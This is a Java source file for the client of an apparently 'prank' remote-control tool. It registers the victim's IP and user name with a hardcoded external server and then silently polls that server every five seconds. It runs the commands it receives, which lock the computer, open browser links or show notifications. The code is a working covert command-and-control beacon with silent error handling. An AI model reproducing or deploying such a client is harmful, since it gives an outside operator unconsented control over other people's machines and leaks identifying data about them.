package ru.prankleo.client.dispatcher;

import org.springframework.core.ParameterizedTypeReference;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.http.converter.HttpMessageConverter;
import org.springframework.http.converter.json.MappingJackson2HttpMessageConverter;
import org.springframework.web.client.RestTemplate;
import ru.prankleo.commons.dto.TrayNotificationCommand;
import ru.prankleo.client.processor.CommandProcessor;
import ru.prankleo.client.processor.LeoNotificationCommandProcessor;
import ru.prankleo.client.processor.OpenLinkInBrowserCommandProcessor;
import ru.prankleo.client.util.NetworkUtil;
import ru.prankleo.commons.dto.Command;
import ru.prankleo.commons.dto.CurrentPointInfo;
import ru.prankleo.commons.dto.LeoNotificationCommand;
import ru.prankleo.commons.dto.LockComputatorCommand;
import ru.prankleo.commons.dto.OpenLinkInBrowserCommand;
import ru.prankleo.client.processor.LockComputatorCommandProcessor;
import ru.prankleo.client.processor.TrayNotificationCommandProcessor;

import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class CommandDispatcher {

    private static final String SERVER_IP = "194.87.236.72";
    private static final int SERVER_PORT = 8088;

    private RestTemplate restTemplate = new RestTemplate();

    private CurrentPointInfo currentPointInfo;

    private static CommandDispatcher ourInstance = new CommandDispatcher();

    private Map<String, CommandProcessor> commandProcessorMap = new HashMap<>();

    private CommandDispatcher() {
        initializeCommandProcessorsMap();
        configureRestTemplate();
    }

    private void initializeCommandProcessorsMap() {
        commandProcessorMap.put(LeoNotificationCommand.class.getName(), new LeoNotificationCommandProcessor());
        commandProcessorMap.put(LockComputatorCommand.class.getName(), new LockComputatorCommandProcessor());
        commandProcessorMap.put(OpenLinkInBrowserCommand.class.getName(), new OpenLinkInBrowserCommandProcessor());
        commandProcessorMap.put(TrayNotificationCommand.class.getName(), new TrayNotificationCommandProcessor());
    }

    private void configureRestTemplate() {
        List<HttpMessageConverter<?>> messageConverters = new ArrayList<>();
        MappingJackson2HttpMessageConverter converter = new MappingJackson2HttpMessageConverter();

        converter.setSupportedMediaTypes(Collections.singletonList(MediaType.ALL));
        messageConverters.add(converter);
        restTemplate.setMessageConverters(messageConverters);
    }

    public static CommandDispatcher getInstance() {
        return ourInstance;
    }

    public void start() {
        registerCurrentPoint();
        startShadowBackgroundTask();
    }

    /**
     * Зарегистрирует текущего пользователя на удаленном сервере для дальнейшего назначения команд
     */
    private void registerCurrentPoint() {
        try {
            HttpHeaders headers = new HttpHeaders();
            headers.setContentType(MediaType.APPLICATION_JSON);

            HttpEntity<CurrentPointInfo> entity = new HttpEntity<>(getCurrentPointInfo(), headers);
            restTemplate.exchange(
                    String.format("http://%s:%d/points/register", SERVER_IP, SERVER_PORT),
                    HttpMethod.POST,
                    entity,
                    String.class
            );
        } catch (Exception ex) {

        }
    }

    /**
     * Запустить поток по таймеру опрашивающий сервер на предмет наличия команд для выполнения
     */
    private static void startShadowBackgroundTask() {
        ScheduledExecutorService service = Executors.newSingleThreadScheduledExecutor();
        service.scheduleWithFixedDelay(CommandDispatcher.getInstance()::refreshCommands, 0, 5, TimeUnit.SECONDS);
    }

    /**
     * Получит с удаленного сервера комманды и выполнит их
     */
    public void refreshCommands() {
        try {
            List<Command> commands = getCommandsFromServer();
            for (Command command : commands) {
                runCommand(command);
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    /**
     * Постучиться на удаленный сервер и вернет список команд
     * @return список запланированных для выполнения команд
     */
    private List<Command> getCommandsFromServer() {
        ResponseEntity<List<Command>> commands = restTemplate.exchange(
                createUrl(),
                HttpMethod.GET,
                null,
                new ParameterizedTypeReference<List<Command>>() {});
        return commands.getBody();
    }

    private void runCommand(Command command) {
        CommandProcessor commandProcessor = commandProcessorMap.get(command.getClass().getName());
        if(commandProcessor != null) {
            sleep(command.getTimeout());
            commandProcessor.runCommand(command);
        }
    }

    private void sleep(long time) {
        try {
            Thread.sleep(time);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private String createUrl() {
        return String.format("http://%s:%d/commands/%s", SERVER_IP, SERVER_PORT, getCurrentPointInfo().getIp());
    }

    private CurrentPointInfo getCurrentPointInfo() {
        if(currentPointInfo == null) {
            currentPointInfo = new CurrentPointInfo();
            currentPointInfo.setIp(NetworkUtil.getCurrentIP());
            currentPointInfo.setUserName(System.getProperty("user.name"));
        }

        return currentPointInfo;
    }
}
